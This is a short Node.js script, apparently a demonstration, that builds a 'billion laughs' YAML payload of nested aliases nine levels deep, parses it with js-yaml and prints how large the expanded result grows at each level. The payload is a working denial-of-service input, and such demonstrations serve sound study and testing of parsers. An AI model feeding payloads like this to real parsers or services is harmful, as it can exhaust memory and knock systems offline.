'use strict';

const jsYaml = require('js-yaml');
const libxmljs = require("libxmljs2");

let yaml = 'lol0: &lol0 ["lol"]';

console.log('#Lolz\tSize (MB)');

const maxLolz = 9;
for (let i = 1; i <= maxLolz; i++) {
    const line = `lol${i}: &lol${i} [${Array(10).fill('*lol' + (i - 1)).join(', ')}]`;
    yaml += `\n${line}`;

    const parsed = jsYaml.load(yaml);
    const expandedLength = (JSON.stringify(parsed).length / 1024 / 1024).toFixed(4);
    console.log(`${i}\t${expandedLength}`);
}
